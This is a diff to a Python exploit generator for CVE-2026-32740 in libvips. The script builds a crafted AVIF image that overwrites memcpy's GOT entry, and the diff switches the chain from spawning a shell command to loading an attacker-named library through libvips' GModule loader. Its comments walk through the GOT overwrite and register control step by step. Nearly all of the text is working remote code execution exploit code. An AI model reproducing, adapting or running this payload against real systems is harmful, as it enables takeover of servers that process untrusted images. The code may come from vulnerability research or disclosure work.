@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Generate the CVE-2026-32740 libvips-relative GOT payload.
+"""Generate the CVE-2026-32740 libvips-relative GModule payload.
 
 This module intentionally contains only the chain used by the final remote
 PoC. Earlier BSS, vtable, Node-loader, and rb-tree-GOT experiments are not
@@ -44,7 +44,7 @@ def _fake_plane_node(write_target: int,
 def build_rce_payload(libvips_base: int,
                       fake_node_low16: int,
                       control_target: int,
-                      command: str | None = None,
+                      library_path: str | None = None,
                       profile: NativeStackProfile | None = None) -> bytes:
     """Build one AVIF from the remotely derived DSO and heap addresses."""
     selected = profile or load_profile()
@@ -54,17 +54,14 @@ def build_rce_payload(libvips_base: int,
         raise ValueError(
             "control target does not match the selected libvips base and profile",
         )
-    payload_command = command or (
-        f"{selected.application.command_executable} "
-        f"{selected.application.script_path}"
-    )
+    selected_path = library_path or selected.application.library_path
     try:
-        encoded_command = payload_command.encode("ascii") + b"\x00"
+        encoded_path = selected_path.encode("ascii") + b"\x00"
     except UnicodeEncodeError as error:
-        raise ValueError("payload command must be ASCII") from error
-    if len(encoded_command) > payload.command_field_bytes:
+        raise ValueError("library path must be ASCII") from error
+    if len(encoded_path) > payload.path_field_bytes:
         raise ValueError(
-            "payload command exceeds the selected profile's command field",
+            "library path exceeds the selected profile's path field",
         )
     if (
         isinstance(fake_node_low16, bool)
@@ -74,16 +71,17 @@ def build_rce_payload(libvips_base: int,
         raise ValueError("fake-node selector must fit an unsigned two-byte value")
 
     # The first chosen-address memcpy starts at the profile's backoff before
-    # memcpy@GOT. Its source row stores the command at RDI and replaces the GOT
-    # slot with a libvips-relative g_spawn_command_line_async address. The next
-    # row calls that helper; a zero source row also gives its GError ** argument
-    # readable zero storage in RSI.
+    # memcpy@GOT. Its source row stores the image-named library path at RDI and
+    # replaces the GOT slot with libvips' internal GModule loader. The next row
+    # calls that loader. It masks the uncontrolled ESI value down to supported
+    # flags, and its successful path does not dereference the original memcpy
+    # length in RDX as a GError **.
     write_target = (
         libvips_base
         + selected.libvips.memcpy_got_offset
         - payload.write_target_backoff
     )
-    row = encoded_command.ljust(payload.command_field_bytes, b"\x00")
+    row = encoded_path.ljust(payload.path_field_bytes, b"\x00")
     row += struct.pack("<Q", control_target)
     row += bytes(payload.chroma_width - len(row))
     write_data = row + bytes(
